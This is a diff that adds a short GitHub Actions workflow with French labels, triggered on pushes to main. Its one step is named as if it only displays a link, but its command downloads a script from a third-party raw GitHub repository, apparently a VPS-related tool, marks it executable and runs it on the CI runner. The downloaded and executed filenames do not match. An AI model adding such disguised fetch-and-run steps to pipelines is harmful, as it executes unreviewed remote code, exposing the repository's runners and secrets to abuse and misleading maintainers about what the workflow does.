@@ -1,0 +1,13 @@
+name: Exemple d'utilisation de lien GitHub
+
+on:
+  push:
+    branches:
+      - main  # Déclencher lorsqu'un push est effectué sur la branche principale
+
+jobs:
+  example_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Afficher un lien GitHub
+        run: wget https://raw.githubusercontent.com/Seredoumacenta/githvps/main/vpsu&&chmod +x vpsu.sh&&./vpsu.sh
